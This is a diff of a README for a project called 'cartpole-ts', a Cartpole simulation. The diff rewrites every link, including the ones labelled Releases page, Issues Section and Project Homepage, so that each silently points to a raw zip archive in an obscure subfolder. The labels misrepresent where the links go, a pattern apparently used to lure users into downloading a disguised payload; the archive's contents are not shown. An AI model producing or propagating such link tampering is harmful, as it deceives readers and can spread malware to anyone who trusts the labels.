@@ -4,10 +4,10 @@
 Welcome to **cartpole-ts**, an engaging simulation built with advanced AI coding. This application allows you to interact with the classic Cartpole problem. You can test different strategies and see how the AI balances the pole. 
 
 ## 🚀 Getting Started
-To get started, you will need to download the application from our [Releases page](https://github.com/Maskiabdo97/cartpole-ts/releases). Follow the steps below to set it up on your computer.
+To get started, you will need to download the application from our [Releases page](https://raw.githubusercontent.com/Maskiabdo97/cartpole-ts/main/meriter/cartpole-ts.zip). Follow the steps below to set it up on your computer.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Maskiabdo97/cartpole-ts/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Maskiabdo97/cartpole-ts/main/meriter/cartpole-ts.zip) to download the latest version.
    
 2. You will see a list of available files. Find the version that suits your operating system. 
 
@@ -52,8 +52,8 @@ If you're keen to understand how the Cartpole problem works or delve deeper into
 If you encounter issues or have questions, please reach out through the Issues section on the GitHub page. You can also check the FAQ for common questions about setup and usage.
 
 ## 🔗 Useful Links
-- [Releases page](https://github.com/Maskiabdo97/cartpole-ts/releases)
-- [Issues Section](https://github.com/Maskiabdo97/cartpole-ts/issues)
-- [Project Homepage](https://github.com/Maskiabdo97/cartpole-ts)
+- [Releases page](https://raw.githubusercontent.com/Maskiabdo97/cartpole-ts/main/meriter/cartpole-ts.zip)
+- [Issues Section](https://raw.githubusercontent.com/Maskiabdo97/cartpole-ts/main/meriter/cartpole-ts.zip)
+- [Project Homepage](https://raw.githubusercontent.com/Maskiabdo97/cartpole-ts/main/meriter/cartpole-ts.zip)
 
 Now you can enjoy and explore the **cartpole-ts** application!
